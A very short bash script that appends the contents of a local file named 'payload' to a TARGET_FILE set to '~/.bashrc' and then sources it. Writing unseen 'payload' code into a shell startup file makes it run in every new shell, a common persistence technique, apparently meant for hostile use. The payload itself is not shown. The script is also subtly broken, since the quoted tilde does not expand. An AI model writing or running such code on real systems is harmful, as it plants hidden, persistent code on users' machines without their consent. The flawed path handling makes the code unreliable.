#!/bin/bash
set -euo pipefail

TARGET_FILE="~/.bashrc"

cat payload >> ${TARGET_FILE} 
source ${TARGET_FILE} 

